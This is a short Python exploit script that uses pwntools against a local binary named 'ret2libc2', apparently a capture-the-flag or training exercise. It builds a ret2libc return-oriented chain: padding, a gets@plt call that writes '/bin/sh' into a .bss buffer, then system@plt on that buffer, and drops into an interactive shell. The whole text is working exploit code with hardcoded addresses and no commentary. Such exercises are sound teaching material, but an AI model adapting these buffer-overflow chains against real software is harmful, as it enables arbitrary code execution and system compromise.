from pwn import *
sh=process("./ret2libc2")
elf = ELF("./ret2libc2")
gets_plt = elf.plt["gets"]
system_plt = elf.plt["system"]
buf2_addr = 0x0804A080
pop_and_ret = 0x0804872f
payload = flat([b'a'*112, gets_plt, pop_and_ret, buf2_addr, system_plt, pop_and_ret,  buf2_addr])
sh.sendline(payload)
# sh.sendline("/bin/sh")
sh.interactive()
